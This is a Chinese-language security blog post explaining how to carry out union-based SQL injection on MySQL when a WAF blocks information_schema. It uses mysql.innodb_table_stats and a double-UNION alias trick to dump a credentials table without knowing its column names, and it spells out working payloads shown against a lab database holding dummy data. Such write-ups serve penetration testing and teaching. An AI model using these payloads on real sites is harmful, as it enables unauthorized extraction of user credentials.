---
title: SQL Injection Without Column Name and information_schema
date: 2022-04-25T21:42:56+08:00
draft: false
url: "/2022/04/25/sql-injection-without-column-name-and-information_schema/"
categories:
  - 資訊安全
  - 網頁安全
showToc: true
TocOpen: false
---

前幾天遇到了一個類似 CTF 的 PT 情境，主要狀況是，我有辦法透過 Union Based 的方法進行 SQL Injection；我有辦法得知 Table name，卻無法得知 Column Name。

先工商一下，如果缺乏測試 SQL 的環境，可以使用我的 Repo: [DB-Tester](https://github.com/stevenyu113228/DB-Tester) ， 用 Docker-compose 的方式建立了一個 Web Server 與 SQL Server，目前有支援 MySQL、PostgreSQL、M$SQL、Oracle 等。

## Background

通常 SQL Injection 的套路就是，透過 `information_schema` 裡面的 `schemata`, `tables`, `columns` 來取得資料庫名稱、表格名稱以及欄位名稱，但在這次的情境中，因為 WAF 的設定，我們無法摸到任何的 `information_schema`，因此只能尋找相關的替代品。

## information_schema 的替代品

在 MySQL 版本 >= 5.5 之後，MySQL 預設的 Table Engine 為 innodb，其中，就有資料庫的名稱以及表格的名稱可以利用

```
mysql> SELECT * FROM mysql.innodb_table_stats;
+---------------+------------+---------------------+--------+----------------------+--------------------------+               
| database_name | table_name | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |               
+---------------+------------+---------------------+--------+----------------------+--------------------------+               
| mysql         | component  | 2022-04-25 12:57:27 |      0 |                    1 |                        0 |               
| sys           | sys_config | 2022-04-25 12:57:29 |      6 |                    1 |                        0 |               
| test_db       | accounts   | 2022-04-25 12:58:06 |      2 |                    1 |                        0 |               
| test_db       | news       | 2022-04-25 12:58:29 |      0 |                    1 |                        0 |
+---------------+------------+---------------------+--------+----------------------+--------------------------+
```

例如想要快速一鍵爆資料庫、資料表名稱，可以使用

```
SELECT GROUP_CONCAT(DISTINCT database_name) FROM mysql.innodb_table_stats;
SELECT GROUP_CONCAT(DISTINCT table_name) FROM mysql.innodb_table_stats;
```

## Basic Union SQL injection

假設我們今天我們的情境有下列兩張 Table，但都還不知道 Column name，我們的注入點在 news 上，希望可以取得`accounts` 中的帳密。

```
# table : news
+----+------------+--------------+
| id | news_title | news_content |
+----+------------+--------------+
|  1 | meow_tttt  | meow_ccc     |
+----+------------+--------------+

# table : accounts
+----+------------+----------------+
| id | username   | password       |
+----+------------+----------------+
|  1 | meow_atnao | meowpass_duzce |
|  2 | meow_lmmyq | meowpass_uhcfc |
|  3 | meow_wuewn | meowpass_kyxhx |
+----+------------+----------------+
```

假設 SQL 使用以下形式，且網頁端只能顯示 1 條 row 的資料

```
SELECT news_title,news_content FROM test_db.news WHERE id = {使用者輸入}
```

我們可以用超級簡單的方法構成 SQL injection

```
-1 UNION SELECT 1,2
-1 UNION SELECT GROUP_CONCAT(column_name),2 FROM information_schema.columns WHERE table_name='accounts' and table_schema='test_db'
```

但今天的情境下，我們摸不到 `information_schema` 要怎麼辦呢?

## Double UNION

我們知道 Union 在 SQL 語法中，有一點像疊加 Row 的意思，因此可以透過這個特性做到一些有趣的事情

假設完整的 SQL Instruction 長這樣

```
mysql> SELECT news_title,news_content FROM test_db.news WHERE id = -1 UNION SELECT 1,2 FROM (SELECT 11,22,33,44,55 UNION SELECT 'a','b','c','d','e')x;
+------------+--------------+
| news_title | news_content |
+------------+--------------+
| 1          | 2            |
+------------+--------------+
```

會分別在 `news_title` 以及 `news_content` 的位置輸出 1 與 2

### 確認 Column 數量

假設我們把後面的 UNION SELECT 修改成 * 的話，若 Column 不匹配，則 SQL 會報錯

```
SELECT news_title,news_content FROM test_db.news WHERE id = -1 UNION SELECT 1,2 FROM (SELECT 11,22,33,44,55 UNION SELECT * FROM test_db.accounts)x
```

會回傳

```
Fatal error: Uncaught mysqli_sql_exception: The used SELECT statements have a different number of columns in /var/www/html/index.php:82 Stack trace: #0 /var/www/html/index.php(82): mysqli->query('SELECT news_tit...') #1 {main} thrown in /var/www/html/index.php on line 82
```

因此，我們可以慢慢地透過修改 11,22,33,44,55 的部分，求出確切的 Column 數，直到不報錯為止，讓 Server 重新吐出 1 與 2。

而我們偷偷作弊看一下上面的表格知道，總共有 3 Column，所以以下的 Payload 可以正常的輸出

```
SELECT news_title,news_content FROM test_db.news WHERE id = -1 UNION SELECT 1,2 FROM (SELECT 11,22,33 UNION SELECT * FROM test_db.accounts)x
```

只看上面 Payload 的括號內部分

```
mysql> SELECT 11,22,33 UNION SELECT * FROM test_db.accounts;

+----+------------+----------------+
| 11 | 22         | 33             |
+----+------------+----------------+
| 11 | 22         | 33             |
|  1 | meow_atnao | meowpass_duzce |
|  2 | meow_lmmyq | meowpass_uhcfc |
|  3 | meow_wuewn | meowpass_kyxhx |
+----+------------+----------------+
```

其實它已經有辦法選出我們想要的 Table 內的所有東西了，不過我們情境的 Union Based SQL injection 只能顯示一個 Row 的內容，因此還需要再做一點點修改。

### 把資料帶出來

我們換成更簡單一點的例子，其實 SQL 有一種別名的功能，可以修改欄位的名稱。

```
mysql> SELECT a,b,c FROM (SELECT 11 a, 22 b, 33 c)x;
+----+----+----+
| a  | b  | c  |
+----+----+----+
| 11 | 22 | 33 |
+----+----+----+
```

因此，套用上面的兩個小特性，我們可以透過這種方法將資料帶出來。

```
mysql> SELECT news_title,news_content FROM test_db.news WHERE id = -1 UNION SELECT b,c FROM (SELECT 11 a,22 b,33 c UNION SELECT * FROM test_db.accounts)x;
+------------+----------------+
| news_title | news_content   |
+------------+----------------+
| 22         | 33             |
| meow_atnao | meowpass_duzce |
| meow_lmmyq | meowpass_uhcfc |
| meow_wuewn | meowpass_kyxhx |
+------------+----------------+
```

## 最終的 Payload

還要記得我們有一個小限制，就是 Union Based SQL injection 有時候會只能出現一個欄位。

### 文雅的解法

我們可以善用 LIMIT，但 `0,1` 會是我們的垃圾，所以第一 Row 不需要取。

```
SELECT news_title,news_content FROM test_db.news WHERE id = -1 UNION SELECT b,c FROM (SELECT 11 a,22 b,33 c UNION SELECT * FROM test_db.accounts)x LIMIT 1,1;
+------------+----------------+
| news_title | news_content   |
+------------+----------------+
| meow_atnao | meowpass_duzce |
+------------+----------------+

SELECT news_title,news_content FROM test_db.news WHERE id = -1 UNION SELECT b,c FROM (SELECT 11 a,22 b,33 c UNION SELECT * FROM test_db.accounts)x LIMIT 2,1;
+------------+----------------+
| news_title | news_content   |
+------------+----------------+
| meow_lmmyq | meowpass_uhcfc |
+------------+----------------+
```

### 一口氣搞定全部

小孩子才慢慢解，大人都直接一行搞定啦， GROUP_CONCAT 很好用，推薦大家都要熟悉，在 UNION 中，無論是有沒有 `information_schema` 都很好用，可以一口氣把所有資料壓成一個 Row，(但其實有長度限制，這又是另外一個故事)。

```
mysql> SELECT news_title,news_content FROM test_db.news WHERE id = -1 UNION SELECT GROUP_CONCAT(b),GROUP_CONCAT(c) FROM (SELECT 11 a,22 b,33 c UNION SELECT * FROM test_db.accounts)x;
+-------------------------------------+-------------------------------------------------+
| news_title                          | news_content                                    |
+-------------------------------------+-------------------------------------------------+
| 22,meow_atnao,meow_lmmyq,meow_wuewn | 33,meowpass_duzce,meowpass_uhcfc,meowpass_kyxhx |
+-------------------------------------+-------------------------------------------------+
```

打完收工

## Reference

- [WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet)
- [simpleCMS Writeup](https://github.com/w181496/CTF/tree/master/codegate2018-prequal/simpleCMS)
